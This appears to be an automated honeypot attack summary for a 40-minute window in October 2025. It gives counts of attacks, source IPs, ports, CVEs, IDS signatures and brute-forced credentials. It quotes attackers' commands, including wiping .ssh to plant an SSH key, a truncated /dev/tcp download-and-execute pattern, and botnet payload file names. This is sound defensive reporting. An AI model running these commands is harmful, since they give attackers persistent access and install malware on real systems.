## Honeypot Attack Summary Report
**Report Generated:** 2025-10-11T17:01:55Z
**Timeframe:** 2025-10-11 16:20:01Z to 2025-10-11 17:00:01Z
**Log Files Analyzed:**
- agg_log_20251011T162001Z.json
- agg_log_20251011T164001Z.json
- agg_log_20251011T170001Z.json

---

### Executive Summary
This report summarizes 16,512 events collected from the honeypot network over a 40-minute period. The majority of attacks were registered by the Cowrie, Redishoneypot, and Honeytrap honeypots. A significant volume of activity originated from IP address `47.180.61.210`, with Redis (port 6379) and SSH (port 22) being the most targeted services. Attackers were observed attempting to download and execute malicious payloads, modify SSH authorized keys, and brute-force credentials. Multiple CVEs were targeted, though in low numbers. Network security signatures primarily triggered for known blocklisted IPs and network scanning activity.

---

### Detailed Analysis

**Attacks by Honeypot:**
- Cowrie: 7690
- Redishoneypot: 2624
- Honeytrap: 2474
- Ciscoasa: 1786
- Suricata: 1446
- ssh-rsa: 174
- Sentrypeer: 111
- Dicompot: 29
- Dionaea: 43
- Tanner: 26
- H0neytr4p: 30
- Mailoney: 31
- Adbhoney: 18
- ElasticPot: 12
- Honeyaml: 8
- Ipphoney: 8
- ConPot: 2

**Top Attacking IPs:**
- 47.180.61.210: 2147
- 47.251.164.177: 1209
- 212.87.220.20: 1018
- 45.192.103.24: 268
- 5.198.176.28: 255
- 43.166.245.172: 323
- 20.244.8.57: 233
- 103.189.234.198: 179
- 103.91.186.236: 252
- 172.245.45.194: 179

**Top Targeted Ports/Protocols:**
- 6379: 2624
- 22: 1124
- 5903: 197
- TCP/5900: 167
- 23: 82
- 5060: 111
- 1221: 78
- 5908: 83
- 5909: 83
- 5901: 72

**Most Common CVEs:**
- CVE-2021-3449 CVE-2021-3449: 3
- CVE-2019-11500 CVE-2019-11500: 2
- CVE-2002-0013 CVE-2002-0012: 3
- CVE-2002-0013 CVE-2002-0012 CVE-1999-0517: 1
- CVE-2020-11910: 1

**Commands Attempted by Attackers:**
- `cd ~; chattr -ia .ssh; lockr -ia .ssh`: 32
- `lockr -ia .ssh`: 32
- `cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa ...">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~`: 32
- `Enter new UNIX password: `: 29
- `Enter new UNIX password:`: 29
- `cat /proc/cpuinfo | grep name | wc -l`: 31
- `cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'`: 31
- `free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'`: 31
- `ls -lh $(which ls)`: 31
- `which ls`: 31

**Signatures Triggered:**
- ET DROP Dshield Block Listed Source group 1: 369
- 2402000: 369
- ET SCAN NMAP -sS window 1024: 154
- 2009582: 154
- ET SCAN MS Terminal Server Traffic on Non-standard Port: 135
- 2023753: 135
- ET DROP Spamhaus DROP Listed Traffic Inbound group 42: 104
- 2400041: 104
- ET DROP Spamhaus DROP Listed Traffic Inbound group 41: 75
- 2400040: 75
- ET INFO Reserved Internal IP Traffic: 57
- 2002752: 57

**Top Users / Login Attempts (user/password):**
- root/: 174
- 345gs5662d34/345gs5662d34: 30
- root/nPSpP4PBW0: 20
- root/Ahgf3487@rtjhskl854hd47893@#a4nC: 17
- root/zhbjETuyMffoL8F: 8
- root/9999999: 6
- guest/passw0rd: 6
- root/Huawei@123: 6
- adam/adam: 5
- nobody/nobody12345: 4

**Files Uploaded/Downloaded:**
- json: 11
- fonts.gstatic.com: 3
- css?family=Libre+Franklin%3A300%2C300i%2C400%2C400i%2C600%2C600i%2C800%2C800i&amp;subset=latin%2Clatin-ext: 3
- ie8.css?ver=1.0: 3
- html5.js?ver=3.7.3: 3
- arm.urbotnetisass;: 2
- arm.urbotnetisass: 2
- arm5.urbotnetisass;: 2
- arm5.urbotnetisass: 2
- x86_32.urbotnetisass;: 2

**HTTP User-Agents:**
- No specific user-agents recorded in this period.

**SSH Clients:**
- No specific SSH clients recorded in this period.

**SSH Servers:**
- No specific SSH servers recorded in this period.

**Top Attacker AS Organizations:**
- No specific AS organizations recorded in this period.

### Key Observations and Anomalies
- **Payload Delivery Attempts:** A recurring pattern involves the use of `nohup bash -c "exec 6<>/dev/tcp/...` to establish a network connection, download a file (often named 'linux') to `/tmp/`, make it executable, and then run it. This indicates a consistent campaign to deploy malware on compromised systems.
- **SSH Key Manipulation:** The command sequence `cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa ...">>.ssh/authorized_keys` was frequently observed. This is a clear attempt by attackers to install their own SSH public key for persistent, passwordless access.
- **Reconnaissance Commands:** Standard reconnaissance commands such as `uname -a`, `whoami`, `cat /proc/cpuinfo`, and `w` are frequently used immediately after a successful login to gather system information.
- **High-Volume Scanners:** A small number of IPs are responsible for a large percentage of the total traffic, with `47.180.61.210`, `47.251.164.177`, and `212.87.220.20` being particularly active across the reporting period.
- **Service Targeting:** Redis (6379) and SSH (22) remain the most heavily targeted services, consistent with common attack vectors for internet-facing servers.
- **Malware Download:** Attackers were observed attempting to download several files with the `.urbotnetisass` extension, suggesting a specific malware family is being deployed.